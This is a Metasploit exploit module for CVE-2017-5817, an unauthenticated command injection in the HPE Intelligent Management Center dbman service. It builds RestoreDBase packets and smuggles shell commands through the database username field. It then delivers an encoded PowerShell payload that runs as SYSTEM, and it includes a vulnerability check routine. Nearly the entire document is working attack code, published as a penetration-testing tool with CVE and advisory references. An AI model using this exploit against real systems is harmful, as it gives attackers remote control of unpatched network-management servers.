# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HPE iMC dbman RestoreDBase Unauthenticated RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerablity in
        Hewlett Packard Enterprise Intelligent Management Center before
        version 7.3 E0504P04.

        The dbman service allows unauthenticated remote users to restore
        a user-specified database (OpCode 10007), however the database
        connection username is not sanitized resulting in command injection,
        allowing execution of arbitrary operating system commands as SYSTEM.
        This service listens on TCP port 2810 by default.

        This module has been tested successfully on iMC PLAT v7.2 (E0403)
        on Windows 7 SP1 (EN).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;sztivi&#039;, # Discovery
          &#039;Chris Lyne&#039;, # Python PoC (@lynerc)
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-5817&#039;],
          [&#039;EDB&#039;, &#039;43195&#039;],
          [&#039;ZDI&#039;, &#039;17-341&#039;],
          [&#039;URL&#039;, &#039;https://www.securityfocus.com/bid/98469/info&#039;],
          [&#039;URL&#039;, &#039;https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03745en_us&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;Payload&#039;        => { &#039;BadChars&#039; => "\x00" },
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 15 },
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;May 15 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
    register_options [Opt::RPORT(2810)]
  end

  def check
    # empty RestoreDBase packet
    pkt = [10007].pack(&#039;N&#039;)

    connect
    sock.put pkt
    res = sock.get_once
    disconnect

    # Expected reply:
    # "\x00\x00\x00\x01\x00\x00\x00:08\x02\x01\xFF\x043Dbman deal msg error, please to see dbman_debug.log"
    return CheckCode::Detected if res =~ /dbman/i

    CheckCode::Safe
  end

  def dbman_msg(database_user)
    data = &#039;&#039;

    db_ip = "#{rand(255)}.#{rand(255)}.#{rand(255)}.#{rand(255)}"
    database_type = "\x03" # MySQL
    restore_type = &#039;MANUAL&#039;
    database_password = rand_text_alpha rand(1..5)
    database_port = rand_text_alpha rand(1..5)
    database_instance = rand_text_alpha rand(1..5)
    junk = rand_text_alpha rand(1..5)

    # database ip
    data << "\x04"
    data << [db_ip.length].pack(&#039;C&#039;)
    data << db_ip

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # junk
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x02\x01\x01"

    # database type
    data << "\x02"
    data << [database_type.length].pack(&#039;C&#039;)
    data << database_type

    # restore type
    data << "\x04"
    data << [restore_type.length].pack(&#039;C&#039;)
    data << restore_type

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # database user
    data << "\x04"
    data << "\x82"
    data << [database_user.length].pack(&#039;n&#039;)
    data << database_user

    # database password
    data << "\x04"
    data << [database_password.length].pack(&#039;C&#039;)
    data << database_password

    # database port
    data << "\x04"
    data << [database_port.length].pack(&#039;C&#039;)
    data << database_port

    # database instance
    data << "\x04"
    data << [database_instance.length].pack(&#039;C&#039;)
    data << database_instance

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x04"
    data << [junk.length].pack(&#039;C&#039;)
    data << junk

    # ???
    data << "\x30\x00"
    data << "\x02\x01\x01"

    data
  end

  def dbman_restoredbase_pkt(database_user)
    data = dbman_msg database_user

    # opcode 10007 (RestoreDBase)
    pkt = [10007].pack(&#039;N&#039;)

    # packet length
    pkt << "\x00\x00"
    pkt << [data.length + 4].pack(&#039;n&#039;)

    # packet data length
    pkt << "\x30\x82"
    pkt << [data.length].pack(&#039;n&#039;)

    # packet data
    pkt << data

    pkt
  end

  def execute_command(cmd, _opts = {})
    connect
    sock.put dbman_restoredbase_pkt "\"& #{cmd} &"
    disconnect
  end

  def exploit
    command = cmd_psh_payload(
      payload.encoded,
      payload_instance.arch.first,
      { :remove_comspec => true, :encode_final_payload => true }
    )

    if command.length > 8000
      fail_with Failure::BadConfig, "#{peer} - The selected payload is too long to execute through Powershell in one command"
    end

    print_status "Sending payload (#{command.length} bytes)..."
    execute_command command
  end
end

